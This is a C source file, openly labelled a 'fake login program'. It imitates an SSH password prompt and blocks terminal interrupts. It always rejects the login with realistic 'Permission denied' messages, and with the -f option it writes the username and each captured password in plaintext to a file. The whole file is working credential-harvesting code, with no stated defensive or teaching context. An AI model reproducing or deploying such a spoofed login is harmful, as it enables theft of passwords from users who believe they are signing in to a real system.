/* login.c -- fake login program.
 * Author: Luis Colorado <luiscoloradourcola@gmail.com>
 * Date: Mon Dec 12 19:59:55 EET 2016
 * Disclaimer: (C) 2016 Luis Colorado.  All rights reserved.
 *
 * BSD 3-Clause License
 * 
 * Copyright (c) 2016, Luis Colorado All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or
 * without modification, are permitted provided that the
 * following conditions are met:
 * 
 * Redistributions of source code must retain the above
 * copyright notice, this list of conditions and the following
 * disclaimer.
 * 
 * Redistributions in binary form must reproduce the above
 * copyright notice, this list of conditions and the following
 * disclaimer in the documentation and/or other materials
 * provided with the distribution.
 * 
 * Neither the name of the copyright holder nor the names of
 * its contributors may be used to endorse or promote products
 * derived from this software without specific prior written
 * permission.
 * 
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND
 * CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES,
 * INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR
 * CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE
 * GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR
 * BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
 * LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT
 * OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 */
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <termios.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <getopt.h>

#define F(x) __FILE__":%d:%s: " x, __LINE__, __func__

#define FLAG_RAW        (1)
#define N_TRIES         (3)

char *username = NULL;

char *vprompt(char *buffer, size_t sz, int flags, const char *fmt, va_list args)
{
    struct termios saved_tty;
    ssize_t n_read;

    /* print the prompt and flush buffers */
    vprintf(fmt, args); fflush(stdout);

    if (flags & FLAG_RAW) {
	/* put in no echo mode */
        struct termios tty;
        tcgetattr(0, &saved_tty);
        tty = saved_tty;
        tty.c_lflag &= ~(ECHO);
        tcsetattr(0, TCSAFLUSH, &tty);
    }

    n_read = read(0, buffer, sz-1);

    if (flags & FLAG_RAW) {
	/* restore tty mode */
        tcsetattr(0, TCSAFLUSH, &saved_tty);
        puts(""); fflush(stdout);
    }

    if (n_read < 0) {
	/* read error */
        return NULL;
    }

	/* erase final \n character */
    while(n_read > 0 && buffer[n_read-1] == '\n')
		n_read--;

	/* finish the string with the null char */
    buffer[n_read] = 0;

    return buffer;
} /* vprompt */

char *prompt(char *buffer, size_t sz, int flags, const char *fmt, ...)
{
    char *res;
    va_list args;

    va_start(args, fmt);
    res = vprompt(buffer, sz, flags, fmt, args);
    va_end(args);

    return res;
} /* prompt */

int main(int argc, char **argv)
{
    char line[1024];
    int i = 0, res;
    char *pass[10];
    char *hostname;
    int opt;
    FILE *out = NULL;

    while ((opt = getopt(argc, argv, "f:")) != EOF) {
    	switch(opt) {
    	case 'f': out = fopen(optarg, "a");
    		if (!out) {
    			fprintf(stderr,
    				F("%s: %s(errno=%d)\n"),
    				optarg, strerror(errno), errno);
    			exit(EXIT_FAILURE);
    		}
    		break;
    	} /* switch */
    } /* while */

    /* skipt command line parameters */
    argc -= optind;
    argv += optind;

    /* collect to use hostname where appropiate */
    res = gethostname(line, sizeof line);
    if (res < 0) {
        fprintf(stderr,
                F("gethostname: %s (errno=%d)\n"),
                strerror(errno), errno);
        exit(EXIT_FAILURE);
    }
    hostname = strdup(line);

    switch(argc) {
    case 1: username = argv[0];  /* we already have a user name */
    case 0: break; /* no username */
    default: /* more than one parameter left */
        fprintf(stderr, F("Usage: login [ user ]\n"));
        exit(EXIT_FAILURE);
    }

    /* ignore quit and interrupt signals from terminal */
    signal(SIGINT, SIG_IGN);
    signal(SIGQUIT, SIG_IGN);

    for(;;) {
	/* inter login delay timeouts */
        static char slp[] = { 0, 1, 1, 2, 3, 5, 8, 13, 21, 34, 55, };
		
        if (!username) {
			/* if no username yet, we have to use one */
            do {
                prompt(line, sizeof line, 0, "login: ");
                username = strdup(line);
            } while (strcmp(username, "") == 0);
        }

	/* ask for a password */
        prompt(line, sizeof line, FLAG_RAW, "%s@%s's password: ",
                username, hostname);
        pass[i] = strdup(line);

	/* don't check, always invalid */
        sleep(slp[i]); /* wait */

        if (++i >= N_TRIES) break;

	/* write message to user */
	printf("Permission denied, please try again\n");
    } /* loop */

    /* final message */
    printf("Permission denied (publickey,password)\n");

    if (out) {
	/* if we have a save file */
	int n = i;
	fprintf(out, "Usuario: %s\n", username);
	for (i = 0; i < n; i++) {
	    fprintf(out, "Password#%d: %s\n", i, pass[i]);
	}
    } /* if */
} /* main */
